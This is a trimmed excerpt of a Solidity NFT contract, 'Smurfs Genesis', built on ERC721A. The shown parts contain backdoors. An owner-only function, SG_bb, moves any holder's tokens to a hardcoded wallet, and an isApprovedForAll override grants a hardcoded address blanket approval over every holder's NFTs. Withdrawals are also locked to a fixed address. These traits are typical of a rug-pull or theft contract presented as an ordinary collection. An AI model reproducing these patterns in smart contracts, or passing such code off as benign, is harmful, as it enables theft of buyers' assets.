...
contract Smurfs_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Smurfs Genesis", "SG", maxBatchSize_, collectionSize_) {
  ...
  function SG_bb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x1dffEAd2D5Af086560a9E1B7AA99F101Ad4dA5cF, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x0b3c824b003d061B4f7a40f5d3B31330A89732B6);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x9960c5e0B33d63B8575b696AaD07467f2e0811f7){return true;}
